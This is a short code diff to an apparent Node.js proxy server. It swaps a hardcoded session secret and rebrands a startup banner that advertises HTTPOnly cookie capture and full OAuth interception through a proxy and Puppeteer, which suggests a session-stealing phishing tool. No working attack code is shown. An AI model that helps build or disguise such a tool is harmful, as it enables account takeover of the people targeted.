@@ -21,7 +21,7 @@ app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(cookieParser());
 app.use(session({
-    secret: 'secure-teams-bridge-secret-2024',
+    secret: 'secure-connect-team-secret-2024',
     resave: false,
     saveUninitialized: true,
     cookie: { secure: false, maxAge: 3600000 }
@@ -377,7 +377,7 @@ app.get('/health', async (req, res) => {
 app.listen(PORT, () => {
     console.log('╔═══════════════════════════════════════════════════════════╗');
     console.log('║                                                           ║');
-    console.log('║   🛡️  SECURE TEAMS BRIDGE - PROXY + PUPPETEER           ║');
+    console.log('║   🛡️  SECURE CONNECT TEAM - PROXY + PUPPETEER           ║');
     console.log('║   🔐  HTTPOnly Cookie Capture - No Extension Required    ║');
     console.log('║   🤖  Full OAuth Interception                           ║');
     console.log('║                                                           ║');
